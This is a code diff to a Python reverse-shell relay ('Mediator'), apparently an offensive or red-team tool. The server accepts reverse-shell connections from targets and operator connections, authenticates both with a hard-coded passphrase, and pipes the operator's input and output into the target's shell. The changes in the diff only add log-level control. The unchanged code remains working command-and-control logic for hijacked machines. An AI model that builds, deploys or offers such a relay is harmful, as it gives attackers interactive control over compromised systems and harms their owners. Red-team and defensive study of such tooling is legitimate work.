@@ -12,7 +12,9 @@ import threading
 
 
 class Mediator:
-    def __init__(self):
+    def __init__(self, logLevel=1):
+        # set log level\
+        self.logLevel = logLevel
         # create reverse shell socket and bind it to a port
         self.targetServer = socket(AF_INET, SOCK_STREAM)
         self.targetServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
@@ -53,46 +55,52 @@ class Mediator:
         while True:
             # wait for reverse shell to connect 
             targetConnection, targetAddress = self.targetServer.accept()
-            print("Target connection initiated from {}".format(targetAddress[0]))
+            if self.logLevel >= 2:
+                print("Target connection initiated from {}".format(targetAddress[0]))
             targetKey = None
             # validate connection is from our reverse shell
             ready = select.select([targetConnection], [], [], 5)
             if ready[0]:
                 targetKey = targetConnection.recv(1024)
             if not targetKey:
-                print("No connection key sent by target {}... Closing connection".format(targetAddress[0]))
-                print("Value of targetKey:", targetKey)
+                if self.logLevel >= 2:
+                    print("No connection key sent by target {}... Closing connection".format(targetAddress[0]))
                 targetConnection.close()
                 continue
             if targetKey.decode() != "I solemnly swear that I am up to no good.":
-                print("Invalid connection key sent by target {}... Closing connection".format(targetAddress[0]))
+                if self.logLevel >= 2:
+                    print("Invalid connection key '{}' sent by target {}... Closing connection".format(targetKey, targetAddress[0]))
                 targetConnection.close()
                 continue
             # add connection to queue
             self.targets[targetKey.decode()] = targetConnection
-            print("Reverse shell connected from {}...".format(targetAddress[0]))
+            if self.logLevel >= 1:
+                print("Reverse shell connected from {}...".format(targetAddress[0]))
 
     def handleOperators(self):
         while True:
             # wait for operator to connect
             operatorConnection, operatorAddress = self.operatorServer.accept()
-            print("Operator connection initiated from {}".format(operatorAddress[0]))
+            if self.logLevel >= 2:
+                print("Operator connection initiated from {}".format(operatorAddress[0]))
             operatorKey = None
             ready = select.select([operatorConnection], [], [], 5)
             if ready[0]:
                 operatorKey = operatorConnection.recv(1024)
             if not operatorKey:
-                print("No connection key sent by operator {}... Closing connection".format(operatorAddress[0]))
-                print("Value of operatorKey:", operatorKey)
+                if self.logLevel >= 2:
+                    print("No connection key sent by operator {}... Closing connection".format(operatorAddress[0]))
                 operatorConnection.close()
                 continue
             if operatorKey.decode() != "I solemnly swear that I am up to no good.":
-                print("Invalid connection key sent by operator {}... Closing connection".format(operatorAddress[0]))
+                if self.logLevel >= 2:
+                    print("Invalid connection key '{}' sent by operator {}... Closing connection".format(operatorKey, operatorAddress[0]))
                 operatorConnection.close()
                 continue
             # add connection to queue
             self.operators[operatorKey.decode()] = operatorConnection
-            print("Operator connected from {}...".format(operatorAddress[0]))
+            if self.logLevel >= 1:
+                print("Operator connected from {}...".format(operatorAddress[0]))
 
     def bridgeConnections(self):
         while True:
@@ -121,7 +129,8 @@ class Mediator:
                                             stdin=fromOperator,
                                             stdout=toTarget,
                                             stderr=toTarget)
-        print("Operator ({}) and target ({}) bridged... Connection ID {}".format(operatorConnection.getpeername()[0], targetConnection.getpeername()[0], self.connCount))
+        if self.logLevel >= 1:
+            print("Operator '{}' and target '{}' bridged... Connection ID {}".format(operatorConnection.getpeername()[0], targetConnection.getpeername()[0], self.connCount))
         # create thread to gracefully close connection when done
         terminatorThread = threading.Thread(target=self.waitAndTerminate,
                                             args=[targetToOperator,
@@ -139,11 +148,11 @@ class Mediator:
         operatorToTarget.wait()
         targetSock.close()
         operatorSock.close()
-
         # connections terminated
-        print("Connection ID {} terminated.".format(connID))
+        if self.logLevel >= 1:
+            print("Connection ID {} terminated.".format(connID))
 
 
 if __name__ == "__main__":
-    server = Mediator()
+    server = Mediator(logLevel=1)
     server.handleConnections()
